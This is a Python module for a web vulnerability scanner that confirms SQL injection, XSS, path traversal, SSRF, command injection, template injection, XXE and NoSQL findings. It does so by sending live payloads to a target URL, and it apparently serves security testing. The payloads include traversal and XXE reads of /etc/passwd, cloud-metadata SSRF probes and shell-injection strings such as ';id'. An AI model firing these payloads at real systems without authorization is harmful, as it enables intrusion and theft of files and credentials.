"""
Vulnerability Validation Service - Micro-Tests

Strict validation to eliminate false positives.
Each vulnerability type has specific micro-tests that MUST pass
before a finding is confirmed.

NO HALLUCINATIONS - Only confirmed, validated vulnerabilities.
"""

import re
import hashlib
import random
import string
import asyncio
import aiohttp
from typing import Optional, Dict, Tuple, List, Any
from urllib.parse import quote, urlencode, urlparse
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)


@dataclass
class ValidationResult:
    """Result of a micro-test validation"""
    is_valid: bool
    confidence: float  # 0.0 to 1.0
    evidence: str
    test_details: Dict[str, Any]


class VulnerabilityValidator:
    """
    Strict vulnerability validation with micro-tests.

    Principle: A vulnerability is ONLY valid if we can:
    1. Trigger it reproducibly
    2. Observe the expected behavior
    3. Differentiate from normal behavior
    """

    def __init__(self, session: aiohttp.ClientSession = None):
        self.session = session
        self._canary_cache = {}

    async def _ensure_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=15),
                connector=aiohttp.TCPConnector(ssl=False)
            )

    async def _request(self, method: str, url: str, **kwargs) -> Tuple[Optional[str], int, Dict]:
        await self._ensure_session()
        try:
            async with self.session.request(method, url, **kwargs) as resp:
                text = await resp.text()
                return text, resp.status, dict(resp.headers)
        except Exception as e:
            logger.debug(f"Request error: {e}")
            return None, 0, {}

    def _generate_canary(self, length: int = 8) -> str:
        """Generate unique canary string for detection"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    # ==================== SQL INJECTION ====================

    async def validate_sqli(self, url: str, param: str, payload: str) -> ValidationResult:
        """
        Validate SQL injection with multiple micro-tests:
        1. Boolean-based: Compare true/false responses
        2. Error-based: Check for SQL error messages
        3. Time-based: Measure response delay
        """
        tests_passed = 0
        total_tests = 3
        evidence_parts = []
        test_details = {"tests": []}

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Get baseline response
        baseline_resp, baseline_status, _ = await self._request("GET", url)
        if not baseline_resp:
            return ValidationResult(False, 0.0, "Could not get baseline", {})

        baseline_length = len(baseline_resp)

        # Test 1: Boolean-based (AND 1=1 vs AND 1=2)
        true_payload = f"' AND '1'='1"
        false_payload = f"' AND '1'='2"

        true_url = f"{base_url}?{param}={quote(true_payload)}"
        false_url = f"{base_url}?{param}={quote(false_payload)}"

        true_resp, true_status, _ = await self._request("GET", true_url)
        false_resp, false_status, _ = await self._request("GET", false_url)

        if true_resp and false_resp:
            # Significant difference in response length indicates boolean-based SQLi
            true_len = len(true_resp)
            false_len = len(false_resp)
            diff_ratio = abs(true_len - false_len) / max(baseline_length, 1)

            if diff_ratio > 0.1 or true_status != false_status:
                tests_passed += 1
                evidence_parts.append(f"Boolean diff: {true_len} vs {false_len} bytes")
                test_details["tests"].append({"type": "boolean", "passed": True, "diff": diff_ratio})
            else:
                test_details["tests"].append({"type": "boolean", "passed": False})

        # Test 2: Error-based
        error_payloads = ["'", "\"", "' OR '", "1' AND '"]
        sql_errors = [
            r"sql syntax",
            r"mysql_",
            r"mysqli_",
            r"pg_query",
            r"sqlite3?_",
            r"ORA-\d{5}",
            r"SQL Server",
            r"ODBC SQL",
            r"syntax error",
            r"unclosed quotation",
            r"quoted string not properly terminated",
            r"Warning.*mysql",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Driver.*SQL.*Server",
            r"SQLException",
            r"Syntax error.*in query",
        ]

        for err_payload in error_payloads:
            err_url = f"{base_url}?{param}={quote(err_payload)}"
            err_resp, _, _ = await self._request("GET", err_url)

            if err_resp:
                for pattern in sql_errors:
                    if re.search(pattern, err_resp, re.IGNORECASE):
                        tests_passed += 1
                        evidence_parts.append(f"SQL error detected: {pattern}")
                        test_details["tests"].append({"type": "error", "passed": True, "pattern": pattern})
                        break
                else:
                    continue
                break
        else:
            test_details["tests"].append({"type": "error", "passed": False})

        # Test 3: Time-based (only if other tests inconclusive)
        if tests_passed < 2:
            time_payload = "' AND SLEEP(3)-- -"
            time_url = f"{base_url}?{param}={quote(time_payload)}"

            import time
            start = time.time()
            await self._request("GET", time_url)
            elapsed = time.time() - start

            if elapsed >= 2.5:  # At least 2.5 seconds delay
                tests_passed += 1
                evidence_parts.append(f"Time-based: {elapsed:.2f}s delay")
                test_details["tests"].append({"type": "time", "passed": True, "delay": elapsed})
            else:
                test_details["tests"].append({"type": "time", "passed": False, "delay": elapsed})

        # Calculate confidence
        confidence = tests_passed / total_tests
        is_valid = tests_passed >= 2  # At least 2 tests must pass

        return ValidationResult(
            is_valid=is_valid,
            confidence=confidence,
            evidence=" | ".join(evidence_parts) if evidence_parts else "No evidence",
            test_details=test_details
        )

    # ==================== XSS ====================

    async def validate_xss(self, url: str, param: str, payload: str) -> ValidationResult:
        """
        Validate XSS with micro-tests:
        1. Canary reflection: Check if unique string is reflected
        2. Context analysis: Verify reflection is in executable context
        3. Encoding bypass: Check if special chars are not encoded
        """
        tests_passed = 0
        evidence_parts = []
        test_details = {"tests": []}

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Test 1: Canary reflection
        canary = self._generate_canary(12)
        canary_url = f"{base_url}?{param}={canary}"
        canary_resp, _, _ = await self._request("GET", canary_url)

        if not canary_resp or canary not in canary_resp:
            return ValidationResult(
                is_valid=False,
                confidence=0.0,
                evidence="Parameter not reflected",
                test_details={"reflection": False}
            )

        tests_passed += 1
        evidence_parts.append("Reflection confirmed")

        # Test 2: Check if <> are reflected unencoded
        tag_test = f"{canary}<test>{canary}"
        tag_url = f"{base_url}?{param}={quote(tag_test)}"
        tag_resp, _, _ = await self._request("GET", tag_url)

        tags_reflected = tag_resp and f"{canary}<test>{canary}" in tag_resp
        if tags_reflected:
            tests_passed += 1
            evidence_parts.append("HTML tags unencoded")
            test_details["tests"].append({"type": "tag_reflection", "passed": True})
        else:
            test_details["tests"].append({"type": "tag_reflection", "passed": False})

        # Test 3: Context analysis - check if reflected in HTML body (not attribute/script)
        contexts = []
        if tag_resp:
            # Check various contexts
            if re.search(rf'<[^>]*{re.escape(canary)}[^>]*>', tag_resp):
                contexts.append("attribute")
            if re.search(rf'<script[^>]*>.*{re.escape(canary)}.*</script>', tag_resp, re.DOTALL):
                contexts.append("script")
            if re.search(rf'>[^<]*{re.escape(canary)}[^<]*<', tag_resp):
                contexts.append("html_body")

        if contexts:
            tests_passed += 1
            evidence_parts.append(f"Context: {', '.join(contexts)}")
            test_details["contexts"] = contexts

        # Test 4: Actual XSS payload execution check
        xss_canary = self._generate_canary(8)
        xss_payloads = [
            f"<script>{xss_canary}</script>",
            f"<img src=x onerror={xss_canary}>",
            f"<svg onload={xss_canary}>",
        ]

        for xss_payload in xss_payloads:
            xss_url = f"{base_url}?{param}={quote(xss_payload)}"
            xss_resp, _, _ = await self._request("GET", xss_url)

            if xss_resp and xss_canary in xss_resp:
                # Check if it's in an executable context
                if re.search(rf'<script[^>]*>{xss_canary}</script>', xss_resp) or \
                   re.search(rf'onerror={xss_canary}', xss_resp) or \
                   re.search(rf'onload={xss_canary}', xss_resp):
                    tests_passed += 1
                    evidence_parts.append(f"Executable XSS: {xss_payload[:30]}")
                    test_details["executable_payload"] = xss_payload
                    break

        confidence = min(tests_passed / 4, 1.0)
        is_valid = tests_passed >= 3  # Need reflection + unencoded + context/executable

        return ValidationResult(
            is_valid=is_valid,
            confidence=confidence,
            evidence=" | ".join(evidence_parts),
            test_details=test_details
        )

    # ==================== LFI ====================

    async def validate_lfi(self, url: str, param: str, payload: str) -> ValidationResult:
        """
        Validate LFI with micro-tests:
        1. Known file content: /etc/passwd must have root:
        2. Multiple depth test: ../../../ vs ../../
        3. Null byte / encoding bypass verification
        """
        tests_passed = 0
        evidence_parts = []
        test_details = {"tests": []}

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # File signatures we know must exist
        file_signatures = {
            "/etc/passwd": [r"root:", r":\d+:\d+:", r"/bin/bash", r"/bin/sh"],
            "/etc/hosts": [r"127\.0\.0\.1", r"localhost"],
            "/proc/self/environ": [r"PATH=", r"HOME=", r"USER="],
            "/windows/system.ini": [r"\[drivers\]", r"\[fonts\]"],
        }

        # Test multiple traversal depths
        depths = ["../../../", "....//....//....//", "..%2f..%2f..%2f", "..%252f..%252f"]

        for depth in depths:
            for file_path, signatures in file_signatures.items():
                test_payload = f"{depth}{file_path.lstrip('/')}"
                test_url = f"{base_url}?{param}={quote(test_payload)}"
                resp, status, _ = await self._request("GET", test_url)

                if resp and status == 200:
                    matches = 0
                    for sig in signatures:
                        if re.search(sig, resp):
                            matches += 1

                    if matches >= 2:  # At least 2 signatures must match
                        tests_passed += 1
                        evidence_parts.append(f"File read: {file_path} ({matches} signatures)")
                        test_details["file_read"] = file_path
                        test_details["payload"] = test_payload
                        break

            if tests_passed > 0:
                break

        # Additional test: Canary for wrapper support
        if tests_passed > 0:
            wrapper_test = f"php://filter/convert.base64-encode/resource=index"
            wrapper_url = f"{base_url}?{param}={quote(wrapper_test)}"
            wrapper_resp, _, _ = await self._request("GET", wrapper_url)

            if wrapper_resp and re.search(r'^[A-Za-z0-9+/]+=*$', wrapper_resp.strip()):
                tests_passed += 1
                evidence_parts.append("PHP wrapper supported")
                test_details["wrapper_support"] = True

        confidence = min(tests_passed / 2, 1.0)
        is_valid = tests_passed >= 1 and "file_read" in test_details

        return ValidationResult(
            is_valid=is_valid,
            confidence=confidence,
            evidence=" | ".join(evidence_parts) if evidence_parts else "No valid LFI",
            test_details=test_details
        )

    # ==================== SSRF ====================

    async def validate_ssrf(self, url: str, param: str, payload: str) -> ValidationResult:
        """
        Validate SSRF with micro-tests:
        1. Localhost access: Check for internal service fingerprints
        2. Internal IP detection: Verify internal network access
        3. Protocol handling: Check supported protocols
        """
        tests_passed = 0
        evidence_parts = []
        test_details = {"tests": []}

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Internal service fingerprints
        internal_services = {
            "http://127.0.0.1:80": [r"<html", r"Apache", r"nginx", r"IIS"],
            "http://127.0.0.1:22": [r"SSH", r"OpenSSH"],
            "http://127.0.0.1:6379": [r"REDIS", r"-ERR", r"redis_version"],
            "http://127.0.0.1:11211": [r"STAT", r"memcache"],
            "http://localhost:8080": [r"<html", r"Tomcat", r"Jenkins"],
            "http://169.254.169.254/": [r"meta-data", r"ami-id", r"instance"],
        }

        for internal_url, signatures in internal_services.items():
            test_url = f"{base_url}?{param}={quote(internal_url)}"
            resp, status, _ = await self._request("GET", test_url)

            if resp:
                for sig in signatures:
                    if re.search(sig, resp, re.IGNORECASE):
                        tests_passed += 1
                        evidence_parts.append(f"Internal access: {internal_url}")
                        test_details["internal_url"] = internal_url
                        test_details["signature"] = sig
                        break

                if tests_passed > 0:
                    break

        # Test for blind SSRF with timing
        if tests_passed == 0:
            # Use a slow endpoint to detect blind SSRF
            import time

            # Test internal vs external timing
            internal_test = f"{base_url}?{param}={quote('http://127.0.0.1:1')}"
            external_test = f"{base_url}?{param}={quote('http://google.com')}"

            start = time.time()
            await self._request("GET", internal_test, timeout=aiohttp.ClientTimeout(total=5))
            internal_time = time.time() - start

            start = time.time()
            await self._request("GET", external_test, timeout=aiohttp.ClientTimeout(total=5))
            external_time = time.time() - start

            # If there's significant timing difference, might be SSRF
            if abs(internal_time - external_time) > 1.0:
                test_details["timing_diff"] = abs(internal_time - external_time)
                # Don't count as passed - timing alone is not enough

        confidence = min(tests_passed / 1, 1.0) if tests_passed > 0 else 0.0
        is_valid = tests_passed >= 1

        return ValidationResult(
            is_valid=is_valid,
            confidence=confidence,
            evidence=" | ".join(evidence_parts) if evidence_parts else "No SSRF confirmed",
            test_details=test_details
        )

    # ==================== RCE ====================

    async def validate_rce(self, url: str, param: str, payload: str) -> ValidationResult:
        """
        Validate RCE with micro-tests:
        1. Command output: Check for known command outputs
        2. Canary execution: Use unique marker in command
        3. Time-based: Use sleep/ping for blind RCE
        """
        tests_passed = 0
        evidence_parts = []
        test_details = {"tests": []}

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        canary = self._generate_canary(12)

        # Commands that produce predictable output
        rce_tests = [
            # Echo canary
            (f"echo {canary}", canary),
            (f"echo+{canary}", canary),
            (f";echo {canary}", canary),
            (f"|echo {canary}", canary),
            (f"`echo {canary}`", canary),
            (f"$(echo {canary})", canary),
            # Known outputs
            (";id", r"uid=\d+"),
            ("|id", r"uid=\d+"),
            (";whoami", r"(root|www-data|apache|nginx|nobody|\w+)"),
            ("|whoami", r"(root|www-data|apache|nginx|nobody|\w+)"),
            # Windows
            ("|dir", r"<DIR>|Volume"),
            ("&dir", r"<DIR>|Volume"),
        ]

        for cmd, expected in rce_tests:
            test_url = f"{base_url}?{param}={quote(cmd)}"
            resp, status, _ = await self._request("GET", test_url)

            if resp:
                if isinstance(expected, str):
                    if expected in resp:
                        tests_passed += 1
                        evidence_parts.append(f"Command executed: {cmd[:20]}")
                        test_details["command"] = cmd
                        test_details["output"] = expected
                        break
                else:
                    if re.search(expected, resp):
                        tests_passed += 1
                        evidence_parts.append(f"Command executed: {cmd[:20]}")
                        test_details["command"] = cmd
                        test_details["pattern"] = expected
                        break

        # Time-based validation for blind RCE
        if tests_passed == 0:
            import time

            sleep_cmds = [";sleep 3", "|sleep 3", "&& sleep 3", "& ping -n 3 127.0.0.1"]

            for sleep_cmd in sleep_cmds:
                test_url = f"{base_url}?{param}={quote(sleep_cmd)}"

                start = time.time()
                await self._request("GET", test_url)
                elapsed = time.time() - start

                if elapsed >= 2.5:
                    tests_passed += 1
                    evidence_parts.append(f"Time-based RCE: {elapsed:.2f}s")
                    test_details["blind_rce"] = True
                    test_details["delay"] = elapsed
                    break

        confidence = 1.0 if tests_passed > 0 else 0.0
        is_valid = tests_passed >= 1

        return ValidationResult(
            is_valid=is_valid,
            confidence=confidence,
            evidence=" | ".join(evidence_parts) if evidence_parts else "No RCE confirmed",
            test_details=test_details
        )

    # ==================== SSTI ====================

    async def validate_ssti(self, url: str, param: str, payload: str) -> ValidationResult:
        """
        Validate SSTI with micro-tests:
        1. Math evaluation: {{7*7}} should return 49
        2. Engine detection: Identify template engine
        3. Code execution: Verify actual template injection
        """
        tests_passed = 0
        evidence_parts = []
        test_details = {"tests": [], "engine": None}

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Math expressions for different engines
        ssti_tests = [
            ("{{7*7}}", "49", "jinja2/twig"),
            ("${7*7}", "49", "freemarker/velocity"),
            ("#{7*7}", "49", "ruby/java"),
            ("<%= 7*7 %>", "49", "erb"),
            ("{{7*'7'}}", "7777777", "jinja2"),  # String multiplication
            ("${7*7}", "49", "thymeleaf"),
            ("@(7*7)", "49", "razor"),
        ]

        for expr, expected, engine in ssti_tests:
            test_url = f"{base_url}?{param}={quote(expr)}"
            resp, status, _ = await self._request("GET", test_url)

            if resp and expected in resp:
                # Verify it's not just reflected
                verify_url = f"{base_url}?{param}={quote(expr.replace('7*7', '8*8'))}"
                verify_resp, _, _ = await self._request("GET", verify_url)

                if verify_resp and "64" in verify_resp:  # 8*8 = 64
                    tests_passed += 1
                    evidence_parts.append(f"SSTI confirmed: {engine}")
                    test_details["engine"] = engine
                    test_details["expression"] = expr
                    break

        confidence = 1.0 if tests_passed > 0 else 0.0
        is_valid = tests_passed >= 1

        return ValidationResult(
            is_valid=is_valid,
            confidence=confidence,
            evidence=" | ".join(evidence_parts) if evidence_parts else "No SSTI confirmed",
            test_details=test_details
        )

    # ==================== XXE ====================

    async def validate_xxe(self, url: str, payload: str) -> ValidationResult:
        """
        Validate XXE with micro-tests:
        1. Entity expansion: Internal entity must expand
        2. File read: External entity to read local files
        """
        tests_passed = 0
        evidence_parts = []
        test_details = {"tests": []}

        canary = self._generate_canary(8)

        # Test 1: Internal entity expansion
        internal_xxe = f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe "{canary}">]>
<root>&xxe;</root>'''

        headers = {"Content-Type": "application/xml"}
        resp, status, _ = await self._request("POST", url, headers=headers, data=internal_xxe)

        if resp and canary in resp:
            tests_passed += 1
            evidence_parts.append("Internal entity expanded")
            test_details["internal_entity"] = True

        # Test 2: File read
        file_xxe = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''

        resp, status, _ = await self._request("POST", url, headers=headers, data=file_xxe)

        if resp and re.search(r"root:.*:\d+:\d+:", resp):
            tests_passed += 1
            evidence_parts.append("File read confirmed (/etc/passwd)")
            test_details["file_read"] = True

        confidence = tests_passed / 2
        is_valid = tests_passed >= 1

        return ValidationResult(
            is_valid=is_valid,
            confidence=confidence,
            evidence=" | ".join(evidence_parts) if evidence_parts else "No XXE confirmed",
            test_details=test_details
        )

    # ==================== NOSQL ====================

    async def validate_nosql(self, url: str, param: str, payload: str) -> ValidationResult:
        """
        Validate NoSQL injection with micro-tests:
        1. Boolean bypass: $ne, $gt operators
        2. Response difference: True vs False conditions
        """
        tests_passed = 0
        evidence_parts = []
        test_details = {"tests": []}

        # Get baseline
        baseline_resp, baseline_status, _ = await self._request("GET", url)
        if not baseline_resp:
            return ValidationResult(False, 0.0, "No baseline", {})

        baseline_len = len(baseline_resp)

        # Test MongoDB operators
        nosql_tests = [
            ('{"$ne": ""}', '{"$eq": "impossible_value_xyz"}'),
            ('{"$gt": ""}', '{"$lt": ""}'),
            ('{"$regex": ".*"}', '{"$regex": "^$"}'),
        ]

        for true_payload, false_payload in nosql_tests:
            true_url = f"{url}?{param}={quote(true_payload)}"
            false_url = f"{url}?{param}={quote(false_payload)}"

            true_resp, true_status, _ = await self._request("GET", true_url)
            false_resp, false_status, _ = await self._request("GET", false_url)

            if true_resp and false_resp:
                true_len = len(true_resp)
                false_len = len(false_resp)

                # Significant difference indicates NoSQL injection
                if abs(true_len - false_len) > baseline_len * 0.1 or true_status != false_status:
                    tests_passed += 1
                    evidence_parts.append(f"NoSQL boolean: {true_len} vs {false_len}")
                    test_details["true_payload"] = true_payload
                    test_details["false_payload"] = false_payload
                    break

        confidence = 1.0 if tests_passed > 0 else 0.0
        is_valid = tests_passed >= 1

        return ValidationResult(
            is_valid=is_valid,
            confidence=confidence,
            evidence=" | ".join(evidence_parts) if evidence_parts else "No NoSQL injection",
            test_details=test_details
        )

    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None


# Global instance
_validator: Optional[VulnerabilityValidator] = None


def get_validator() -> VulnerabilityValidator:
    global _validator
    if _validator is None:
        _validator = VulnerabilityValidator()
    return _validator


async def validate_finding(vuln_type: str, url: str, param: str = None, payload: str = None) -> ValidationResult:
    """Convenience function to validate a finding"""
    validator = get_validator()

    vuln_type_lower = vuln_type.lower()

    if 'sql' in vuln_type_lower and 'nosql' not in vuln_type_lower:
        return await validator.validate_sqli(url, param, payload)
    elif 'xss' in vuln_type_lower:
        return await validator.validate_xss(url, param, payload)
    elif 'lfi' in vuln_type_lower or 'path' in vuln_type_lower or 'traversal' in vuln_type_lower:
        return await validator.validate_lfi(url, param, payload)
    elif 'ssrf' in vuln_type_lower:
        return await validator.validate_ssrf(url, param, payload)
    elif 'rce' in vuln_type_lower or 'command' in vuln_type_lower:
        return await validator.validate_rce(url, param, payload)
    elif 'ssti' in vuln_type_lower or 'template' in vuln_type_lower:
        return await validator.validate_ssti(url, param, payload)
    elif 'xxe' in vuln_type_lower:
        return await validator.validate_xxe(url, payload)
    elif 'nosql' in vuln_type_lower:
        return await validator.validate_nosql(url, param, payload)
    else:
        return ValidationResult(False, 0.0, "Unknown vulnerability type", {})
